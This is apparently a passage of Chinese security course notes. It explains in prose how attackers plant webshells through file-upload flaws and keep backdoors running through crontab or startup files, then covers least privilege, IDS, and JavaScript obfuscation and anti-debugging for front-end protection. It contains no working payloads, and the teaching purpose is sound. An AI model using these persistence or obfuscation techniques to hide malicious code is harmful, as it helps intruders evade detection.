那木马可不可以不依附于应用，直接隐藏自己呢？当然可以。那么，“后门”就发展成了 Rootkit。通常来说，Rootkit 会驻扎于内核中，通过修改内核的逻辑来完成“后门”的功能。因为内核具备较高的权限，所以 Rootkit 就能破坏杀毒软件这样的安全进程，而不被轻易发现。同样地，因为 Rootkit 驻扎在内核中，理论上，除了重装系统以外，没有其他更好的方式来根除“后门”。

#### 黑客如何将“后门”植入到系统？

最直接的方式就是通过权限提升，即黑客直接获取到系统的命令执行权限，然后通过网络将“后门”程序从云端下载下来。

除此之外，黑客还可以通过文件上传漏洞向服务器上传一个程序。在使用应用的时候，用户经常需要上传一些文件，比如：头像的图片、邮件附件和简历等。很多时候，开发人员为了方便，会直接将上传的文件存储到当前目录，也就是 Web 服务的目录中。这个时候，如果黑客上传的是一个 PHP 文件，那么这个 PHP 文件就会被放入到 Web 服务的目录中。因此，黑客只需要上传一个包含 WebShell 的 PHP 文件，就成功了植入了一个“后门”。

通过权限提升或者文件上传漏洞成功植入“后门”之后，黑客还需要保证“后门”的持久化。因此，“后门”需要常驻于系统的后台，并能够随着系统的开关机而启动。为了实现这个目的，黑客通常会在定时任务（crontab）或者开机启动项（inittab、rc.local）的配置中，加上“后门”的执行命令。

除此之外，黑客还可以利用伴随于系统的常驻进程来保证“后门”的持久化。对于 WebShell 来说，只要 Web 服务保持可用，那么 WebShell 也一直可用。对于 Rootkit 来说，它们会直接篡改内核的初始函数来进行自启动，也就更难被发现和去除。

总之，持久化要么是通过定时任务、开机启动等方式来实现，要么就是通过伴随于系统的常驻进程来实现。

### 面对权限提升和持久化，该怎么进行防护？

两种常见的防护方法，它们分别是：最小权限原则和 IDS。

首先，最基础的防护是从制度和技术上去落实最小权限原则。所谓最小权限原则，就是给每一个用户和进程等，只分配它们需要用到的权限。从技术实现上来说，可以通过配置一定的访问控制策略来进行强化，比如在 Linux 中给予特定进程单独的角色权限等，这部分内容我会在后续的课程中详细介绍。通过最小权限原则的落实，你就能够限制黑客在每一次权限提升时得到的收益，甚至阻断黑客权限提升的可能。

其次，就是利用 IDS（Intrusion Detection System，入侵检测系统）对黑客的异常行为进行检测。IDS 的检测原理就是，通过分析正常用户和黑客在网络层或者主机层中的行为异同，来识别黑客的攻击。比如，正常用户不会去连接内网中不相干的主机，而黑客则必须通过扫描去探测内网等。

如果黑客已经在进行权限提升和持久化的操作了，这就意味着应用和系统已经出现了各种漏洞。因此，在这个前提下，我们要考虑的不是如何去修复和避免漏洞，而是在出现漏洞后，如何降低损失并尽早发现漏洞。这其实也是安全中纵深防御的一种思想：对不同的层级进行不同的防御，即使前面层漏过了，下一层还能够接着进行防护。

![19][19]

## 前端安全：如何打造一个可信的前端环境？

我们先来看一个攻击事件。2017 年，12306 网站被曝出有“买下铺”的功能。我们都有过买票的经历，当我们在 12306 上买卧铺的时候，是没法选择上铺、中铺还是下铺的。但是，有人去分析了 12306 的前端代码，发现里面其实包含了选铺位的功能，只是默认为随机，没有展示出来。所以，有人通过篡改前端代码，就将这个功能开放出来了。

![20][20]

一旦黑客能够完全摸清楚应用的前端代码，就能够任意地篡改前端的逻辑，实现带有想要功能的前端应用了。

如果说 12306 的例子，还不足以让你对前端安全产生警惕的话，你可以想一想，我们在网上看到的各种所谓的“破解版”软件，其实都是人为修改了应用的前端认证功能，从而不需要认证就可以正常使用。

除了篡改前端代码，黑客还可以通过对前后端接口的调用过程进行分析，复刻出一个自己的前端应用。在黑客复刻的前端应用中，所有的接口认证和加密都合法，只是调用的顺序完全由黑客掌控。粉丝圈比较流行的各类明星应援工具，其实都是基于这个原理实现的：黑客通过分析微博客户端的接口，自己打包了一个前端应用，实现了一键关注、点赞等功能。因为这些接口都是合法的，所以后端人员很难分辨出这些请求是来自于正规的应用，还是黑客自己实现的应用。

针对前端的攻击可以说是“防不胜防”，这让后端没有办法信任前端的环境，甚至没有办法信任前端发起的请求和上传的数据，极大地影响了公司和应用的正常发展。那么，我们应该通过什么方法来保障前端的可信呢？

### 什么是混淆技术？

要解决这个问题，我们可以先想一下黑客攻击前端的过程：黑客通过分析前端代码，来篡改前端逻辑，实现带有想要功能的前端应用。那有没有一种方法，无法让黑客在前端代码中分析出有效信息呢？答案就是混淆。

在理想状态下，我们混淆了前端代码之后，不仅能让黑客无法篡改前端代码，还能保证即使黑客成功篡改代码，那么篡改后的前端代码依然不可用。同时，黑客无法获得前端的接口密钥和签名等信息，也就无法伪造正常的前端应用去发起请求了。

我们知道，安全中通常不存在理想状态。我们最需要做的，就是不断地升级对抗，来接近这个理想的目标。

刚才我们说的是混淆技术可以实现的结果，那混淆技术究竟是什么呢？在不同的语言和环境（如：Android 、iOS 和 Web）中，混淆技术都是相对独立的。尽管混淆技术相对独立，但我还是希望，你可以通过理解一门语言的混淆技术和思路，做到“一通百通”。我也希望能够更好地启发你去思考，如何去做好前端安全。接下来，我就以 JavaScript 为例，带你梳理混淆的常见技术和思路。

#### 清晰代码无序化

在实际工作中，开发人员总是会要求自己写出清晰简洁的代码。但是，这也为黑客的代码分析提供了便利。因此，混淆的第一步，一定是想办法让我们的 JavaScript 代码变得“难看”，也就是将整洁的代码变得无序。

有什么办法能让代码变得“难看”呢？我这里通过一个例子来具体解释一下，你就能明白了。

我们先来看一段代码。

```js
function obfuscate() {
  console.log("I'm obfuscator!");
}
obfuscate();
```

我们一眼就能够看出这段代码的逻辑：有一个 obfucate 方法，这个方法会打出一行日志，日志内容为“I’m obfuscator!”。
在 JavaScript 中，空格、换行、缩进这些内容，只是为了让代码看起来更清晰。所以，这些对代码没有影响，只是便于开发人员查看的内容，完

全可以去除。这样一来，这段代码我们就可以改成下面这样：

```js
function obfuscate(){console['log']('I'm obfuscator!');}obfuscate();
```

把代码压缩成一行后，黑客想要阅读就已经比较吃力。在此基础上，我们还可以让它变得更“难看”。实际上，JavaScript 中的方法名和变量名也不影响逻辑执行，只是开发人员用来表示方法和变量的含义，完全可以用没有意义的随机字符替代。随机字符代替后的效果如下：

```js
function _0xc648a(){console['log']('I\x27m\x20obfuscator!');}_0xc648a();
```

#### 简单逻辑复杂化

对于上面这段无序化后的代码，只要黑客稍微花点心思去阅读，再配合一些 JavaScript 格式化的工具，也能够弄明白它的逻辑。归根结底还是因为这段代码“太简单了”。那么，我们是不是能够让原本简单的代码变得复杂呢？实现方法有很多种，我们先来看最简单的一种：加入无意义的代码。

我们还是以最开始的简单代码为例。

```js
function obfuscate() {
  console.log("I'm obfuscator!");
}
obfuscate();
```

在这段代码中，本来输出的日志就是一个固定的字符串“I’m obfuscator!”。但是，我们可以先将这段字符串放在一个字典中，然后再通过字典去获取字符串。修改后的效果如下：

```js
function obfuscate() {
    var _0x16df9a = { 'HXGCi': 'I\x27m\x20obfuscator!' };
    console['log'](_0x16df9a['HXGCi']);
}
obfuscate();
```

这就是通过字典等形式，将常量变成变量的混淆方法。在此基础上，我们还可以加入一些无意义的 switch、if 和 while 语句，进一步将代码复杂化。

除了加入一些无意义的代码，我们还可以加入一些不会被执行的代码，让混淆的结果更有威慑力。比如下面这段代码：

```js
(function (_0x2177d9, _0x1442cc) {
    var _0xb84613 = function (_0x5a2b5f) {
        while (--_0x5a2b5f) {
            _0x2177d9['push'](_0x2177d9['shift']());
        }
    };
    _0xb84613(++_0x1442cc);
}(_0x1808, 0x1ea));
function obfuscate() {
    console['log']('I\x27m\x20obfuscator!');
}
obfuscate();
```

在这段代码中，中间的 function (_0x2177d9, _0x1442cc) 就不会被执行，它的目的仅仅是让代码看起来更复杂而已。

#### 固定字符动态化

在我们前面说的这几个混淆代码的例子中，关键字符串“I’m obfuscator!”始终都存在。如果黑客关心的只是这个字符串，那它通过搜索就可以很快定位到。也就是说，通过前面几种方式混淆的前端代码，其中的接口、密钥和签名等信息，黑客还是很容易就可以获取到。

既然关键字符串“存在”于代码中就不安全，那有没有方法可以让关键字符串“消失”呢？我们可以通过加入一些逻辑，让这些关键字符串只有在实际运行的时候，才会被计算出来。

最简单、最直接的思路就是，我们可以将关键字符串改成多个字符串拼接的形式。效果如下：

```js
function obfuscate() {
    console['log']('I\x27m\x20o' + 'bfusc' + 'ator!');
}
obfuscate();
```

通过这样改写的方式，黑客就没有办法通过搜索功能，找到“I’m obfuscator!”的位置了。

但是，这种简单分割字符串的方式很容易被发现。所以，我们可以将这些字符串从它原本的位置拿出来，通过更复杂的方法（如：数组的引用、方法的调用等）来获取。效果如下：

```js
var _0x5e96 = [
    'bfusc',
    'ator!',
    'log',
    'I\x27m\x20o'
];
(function (_0x520fe6, _0x366376) {
    var _0x38fe5f = function (_0x456d44) {
        while (--_0x456d44) {
            _0x520fe6['push'](_0x520fe6['shift']());
        }
    };
    _0x38fe5f(++_0x366376);
}(_0x5e96, 0x15e));
var _0x40ca = function (_0x520fe6, _0x366376) {
    _0x520fe6 = _0x520fe6 - 0x0;
    var _0x38fe5f = _0x5e96[_0x520fe6];
    return _0x38fe5f;
};
function obfuscate() {
    console[_0x40ca('0x0')](_0x40ca('0x1') + _0x40ca('0x2') + _0x40ca('0x3'));
}
obfuscate();
```

这样一来，黑客想要快速找到 _0x40ca(‘0x1’) 具体指什么，就需要花上一番功夫了。

### 反调试

前面 3 种技术都是直接对源码进行混淆。但是，大多数情况下，黑客在分析代码的时候，不是直接阅读源码，而是通过调试的方法在 JavaScript 代码运行过程中，获取实际的代码执行方向以及变量的值。因此，为了保护前端安全，我们要采用反调试技术。在 JavaScript 中，主要有两种方法可以对抗调试：域名锁定和无限断点。下面，我们一一来看。

#### 第一种是域名锁定

当黑客来想要分析一个网页的时候，通常会将代码下载下来放到本地运行。但是，我们更希望这个分析过程仍然发生在当前的域名下，这样我们就能够通过请求去分析黑客到底干了什么。因此，我们可以在 JavaScript 中加入一段域名判断的逻辑。这样一来，当 JavaScript 运行的环境是 localhost（本地主机）域名，或者其他未知的域名时，JavaScript 就会产生错误，黑客就无法正常运行下载后的 JavaScript 文件了。

我来举个例子。在 JavaScript 中，我们可以通过 window.location.host 获取当前域名，然后判断这个域名是否等于网站的域名，比如 server.com。如果不等于的话， 说明 JavaScript 不是通过正常访问域名的形式执行的。因此，JavaScript 会直接返回，不执行后续的逻辑。代码如下：

```js
function obfuscate() {
  if(window.location.host != 'server.com'){
    return;
  }
  console.log("I'm obfuscator!");
}
obfuscate();
```

#### 第二种是无线断点

在调式技术中，我们最常用到的功能就是断点。通过设置断点，我们可以让程序停留在某一个代码或者指令上，方便查看停留的这个时刻中各个变量的具体值是什么。

在 JavaScript 中，debugger 指令就是用来添加断点的。所以，在反调试的时候，我们可以在 JavaScript 中开启一个单独的线程，来循环调用 debugger。这样一来，如果黑客进入到调试模式，就会不断地停滞在无意义的断点处，从而无法正常调试。在正常运行 JavaScript 的时候，debugger 不会生效，也就不会影响用户的正常使用。

除此之外，针对提供了额外的 JavaScript 接口的浏览器（比如 Chrome），我们可以通过在 JavaScript 中检测开发者工具是否开启等特征，来实现反调试。开发者工具是开发人员在调试过程中必须使用的工具，一旦开启，基本就代表已经进入调试状态了。因此，我们可以在检测到开发者工具开启的时候，不去执行正常的 JavaScript 逻辑，这样就能够起到反调试的作用了。

好了，说完了这 4 种混淆技术，我要提醒你一点。这些混淆技术不是独立使用的，而应该是组合使用的。完整的混淆流程应该是这样的：首先，我们可以在原有的 JavaScript 代码中加入反调试的逻辑，然后通过简单逻辑复杂化和固定字符动态化的方法，隐藏原有的逻辑和反调试的逻辑。最后，通过清晰代码无序化，将所有的额外信息进行剔除，最终将代码变成了压缩成一行的 JavaScript 文件。

### 混淆技术有什么负面影响？

尽管混淆技术是保护前端安全的重要技术，但混淆技术改变了前端代码，就不可避免会影响前端的功能。这也是混淆始终达不到理想状态的一个主要原因。对于 JavaScript 的混淆来说，它的负面影响主要包括三个方面：增加体积、影响性能和无法分析报错。

混淆带来的最直接影响就是增加代码体积。在固定字符动态化的例子中，原本简单的 4 行代码经过混淆之后，变成了几十行。如果应用更复杂一些，一个几 KB 的 JavaScript 文件经过混淆之后变成几百 KB，也是很正常的事情。这样一来，用户网络加载一个大型的 JavaScript 文件，所面对的消耗、加载时的延迟以及运行时的内存等都会有明显增长。

除了增加代码体积以外，混淆还会增加额外的执行逻辑，降低代码执行的速度影响性能。比如说，console.log 本来只是一个简单的指令，但是在混淆之后，JavaScript 需要对它进行数据的取值、索引的计算以及字符串的拼接等操作。这样一来，混淆后的代码执行速度必然会下降。

而且这些无用的操作，事实上是可以无限添加的。因此，在混淆的时候，如何把控复杂化的程度，是我们需要谨慎考量和测试的。

还有一点是不可避免的，那就是混淆后的代码，不仅黑客无法阅读，你其实也无法阅读。在混淆之前，如果前端出现错误，我们可以直接通过错误信息定位错误；但是在混淆之后，错误信息会变得“很难看”，而且代码只会剩下一行，我们也就无法定位了。

你还需要注意一点：混淆不可能让代码变得完全不可读。因为你的代码最终需要执行在用户终端，而执行的条件就是终端能够读懂代码。以 JavaScript 为例，黑客完全可以自己定义一个浏览器来执行 JavaScript 代码。这样一来，尽管黑客没办法直接阅读 JavaScript 文件，但仍然可以通过浏览器执行的指令集和内存环境来进行分析。

## 参考

- 极客时间《安全攻防技能30讲》

[1]: /images/security/security-web/1.jpg
[2]: /images/security/security-web/2.jpg
[3]: /images/security/security-web/3.jpg
[4]: /images/security/security-web/4.jpg
[5]: /images/security/security-web/5.jpg
[6]: /images/security/security-web/6.jpg
[7]: /images/security/security-web/7.jpg
[8]: /images/security/security-web/8.jpg
[9]: /images/security/security-web/9.jpg
[10]: /images/security/security-web/10.jpg
[11]: /images/security/security-web/11.jpg
[12]: /images/security/security-web/12.jpg
[13]: /images/security/security-web/13.jpg
[14]: /images/security/security-web/14.jpg
[15]: /images/security/security-web/15.jpg
[16]: /images/security/security-web/16.jpg
[17]: /images/security/security-web/17.jpg
[18]: /images/security/security-web/18.jpg
[19]: /images/security/security-web/19.jpg
[20]: /images/security/security-web/20.jpg
